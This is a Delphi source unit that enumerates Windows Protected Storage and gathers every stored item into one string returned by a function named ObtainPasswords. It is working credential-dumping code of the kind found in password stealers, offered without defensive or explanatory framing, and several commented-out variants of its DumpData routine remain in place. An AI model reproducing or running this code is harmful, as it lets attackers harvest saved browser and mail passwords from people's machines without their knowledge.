unit UnitStorage;

interface

uses
  Windows,PStorage,activex,
  PStorageIntfs, CompressionStreamUnit;

type
  PStorageType = ^TStorageType;
  TStorageType = record
    T: BYTE;
    pType: TGUID;
  end;

  PStorageSubtype = ^TStorageSubtype;
  TStorageSubtype = record
    T: BYTE;
    pType: TGUID;
    pSubtype: TGUID;
  end;

  PStorageItem = ^TStorageItem;
  TStorageItem = record
    T: BYTE;
    pType: System.TGUID;
    pSubtype: System.TGUID;
    pItem: ShortString;
  end;

var
  sString: string;
  IDs: TIDList;
  i: Integer;
  pGUID: System.TGUID;
  Storage: TPStorage;
  AllData: string;
  MainType: string;
  SubType: string;

function ObtainPasswords: string;

implementation

{function DumpData(Buffer: pointer; Length: Word): String;
var
  Iterator: integer;
  AsciiBuffer: string;
begin
  AsciiBuffer := '';
  for Iterator := 0 to Length - 1 do
  begin
    if char(pointer(integer(Buffer) + Iterator)^) in [#32..#126] then
      AsciiBuffer := AsciiBuffer + char(pointer(integer(Buffer) + Iterator)^)
    else
      AsciiBuffer := AsciiBuffer + '';
  end;
  Result := AsciiBuffer;
end;}

{function DumpData(Buffer: pointer; Length: Word): string;
var
  Iterator: integer;
  AsciiBuffer: string;
begin
  AsciiBuffer := '';
  for Iterator := 0 to Length - 1 do
    begin
      if char(pointer(integer(Buffer) + Iterator)^) in [#32..#127] then
        AsciiBuffer := AsciiBuffer + '' + char(pointer(integer(Buffer) + Iterator)^) + ''
      else
        AsciiBuffer := AsciiBuffer + '.';
    end;
  Result := AsciiBuffer;
end; }

{function DumpData(Buffer: Pointer; BufLen: DWord): String;
var 
  i, j, c: Integer; 
begin 
  c := 0; 
Result := ''; 
  for i := 1 to BufLen div 16 do begin 
    for j := c to c + 15 do 
      if (PByte(Integer(Buffer) + j)^ < $20) or (PByte(Integer(Buffer) + j)^ > $FA) then 
        Result := Result 
      else 
        Result := Result + PChar(Integer(Buffer) + j)^; 
    c := c + 16; 
  end; 
  if BufLen mod 16 <> 0 then begin 
    for i := BufLen mod 16 downto 1 do begin 
      if (PByte(Integer(Buffer) + Integer(BufLen) - i)^ < $20) or (PByte(Integer(Buffer) + Integer(BufLen) - i)^ > $FA) then 
        Result := Result 
      else 
        Result := Result + PChar(Integer(Buffer) + Integer(BufLen) - i)^;
        end;
  end;
end;}

function DumpData(Buffer: pointer; Length: Word): string;
var
  Iterator: integer;
  AsciiBuffer: string;
begin
  {AsciiBuffer := '';
  for Iterator := 0 to Length - 1 do
    begin
      if char(pointer(integer(Buffer) + Iterator)^) in [#32..#127] then
        AsciiBuffer := AsciiBuffer + '' + char(pointer(integer(Buffer) + Iterator)^) + ''
      else
        AsciiBuffer := AsciiBuffer + '';
    end;
  Result := AsciiBuffer;}
  if Buffer = nil then exit;
  if Length = 0 then exit;
  SetString(Result,pchar(Buffer),Length);
end;

function GUIDToString(pGUID: System.TGUID): string;
var
  P: PWideChar;
begin
  StringFromCLSID(pGUID, P);
  Result := WideCharToString(P);
end;

procedure ShowItems(pGUID: System.TGUID; pSubtypeGUID: System.TGUID);
var
  Mem: Pointer;
  MemLen: Cardinal;
  k: integer;
  ItemsList: TItemList;
begin
  ItemsList := Storage.GetItems(pGUID, pSubtypeGUID);
  for k := 0 to ItemsList.Count-1 do begin
    //SetLength(sString, 1);
    AllData := AllData + MainType + '|' + SubType + '|' + ItemsList.Get(k) + '|';
    Storage.ReadItemData(pGUID, pSubtypeGUID, ItemsList.Get(k), Mem, MemLen);
    AllData := AllData + DumpData(Mem, MemLen) + #13#10;
    CoTaskMemFree(Mem);
  end;
end;

procedure ShowSubTypes(pGUID: System.TGUID);
var
  j: integer;
  SubIDs: TIDList;
  pSubtypeGUID: System.TGUID;
begin
  SubIDs := Storage.GetSubtypes(pGUID);
  for j := 0 to SubIDs.Count - 1 do begin
    pSubtypeGUID := SubIDs.Get(j);
    SetLength(sString, 1);
    SubType := Storage.GetSubtypeName(pGUID, pSubtypeGUID);
    ShowItems(pGUID, pSubtypeGUID);
    if GUIDToString(pSubtypeGUID) = GUIDToString(pGUID) then Continue;
  end;
end;

function DumpProtectedStorage: dword;
var
  IDs: TIDList;
  i: Integer;
  pGUID: System.TGUID;
begin
  Storage := TPStorage.Create;
  if not Storage.Initialized then
  begin
    Result := 0;
    Exit;
  end;
  if Storage.Connect(nil) then begin
    IDs := Storage.GetTypes;
    for i := 0 to IDs.Count - 1 do begin
      pGUID := IDs.Get(i);
      MainType := Storage.GetTypeName(pGUID);
      ShowSubTypes(pGUID);
    end;
  end;
  Storage.Free;
end;

function ObtainPasswords: string;
begin
  AllData := '';
  DumpProtectedStorage;
  Result := AllData;
end;


end.
